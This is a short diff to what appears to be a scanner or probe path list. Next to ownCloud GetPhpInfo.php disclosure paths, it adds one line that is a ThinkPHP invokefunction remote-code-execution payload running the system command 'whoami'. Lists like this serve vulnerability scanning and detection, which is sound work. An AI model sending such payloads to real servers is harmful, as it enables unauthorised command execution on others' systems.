@@ -43,3 +43,4 @@
 /test
 /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/{{rand_base(4)}}.css
 /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/{{rand_base(4)}}.css
+/public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
